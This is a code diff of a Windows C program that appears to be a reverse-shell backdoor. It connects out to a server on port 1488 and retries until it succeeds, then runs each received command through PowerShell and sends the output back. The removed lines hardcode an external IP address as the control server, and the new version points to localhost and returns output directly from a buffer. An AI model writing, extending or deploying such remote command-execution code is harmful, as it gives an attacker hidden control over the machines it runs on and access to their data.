@@ -9,13 +9,9 @@
 #include <io.h>
 #include <fcntl.h>
 #include "commandmanager.h"
+#include <windows.h>
 
-#define MAX_SIZE_C 200000
-#define MAX_SIZE_W 200000
-
-FILE *OUTPUT_FILE;
-
-void read_output(wchar_t *woutput);
+#define MAX_SIZE 200000
 
 int main()
 {
@@ -32,11 +28,7 @@ int main()
     sai.sin_family = AF_INET;
     sai.sin_port = htons(1488);
 
-    FILE *pFile;
-    pFile = fopen("output.txt", "w");
-    fclose(pFile);
-
-    sai.sin_addr.S_un.S_addr = inet_addr("178.64.119.39");
+    sai.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
     
     int result;
     while ((result = connect(
@@ -46,8 +38,9 @@ int main()
             Sleep(10000);
         }
 
-    wchar_t dataw[MAX_SIZE_C];
-    unsigned char datac[MAX_SIZE_W];
+    wchar_t dataw[MAX_SIZE];
+    unsigned char datac[MAX_SIZE];
+    int written_bytes = 0;
 
     memset(dataw, 0, sizeof(dataw));
     memset(datac, 0, sizeof(datac));
@@ -59,40 +52,12 @@ int main()
             int iconverted = MultiByteToWideChar(
                 CP_UTF8, 0, datac, -1, dataw, nibites);
         to_powershell_command(dataw);
-        execute_powershell_command(dataw);
-        Sleep(2000);
-
-        read_output(dataw);
-        int nobites = WideCharToMultiByte(CP_UTF8, 0, (const wchar_t *) dataw, -1, NULL, 0, NULL, NULL);
-            int oconverted = WideCharToMultiByte(
-                CP_UTF8, 0, (const wchar_t *) dataw, -1, datac, nobites, NULL, NULL);
+        execute_powershell_command(dataw, datac, &written_bytes);
+        Sleep(1000);
         
-        send(soc, datac, oconverted, 0);
+        send(soc, datac, written_bytes, 0);
     }
     
 
     return 0;
-}
-
-void read_output(wchar_t *woutput)
-{
-    FILE *foutput;
-    foutput = fopen("output.txt", "rt+, ccs=UTF-8");
-    if (foutput == NULL)
-    {
-        _putws(L"File cannot be open\n");
-        return;
-    }
-
-    int i = 0;
-    for (int s = fgetwc(foutput); s != WEOF; s = fgetwc(foutput))
-    {
-        woutput[i] = ((wchar_t) s);
-        i++;
-    }
-
-    fclose(foutput);
-    woutput[i] = '\0';
-
-    return;
 }
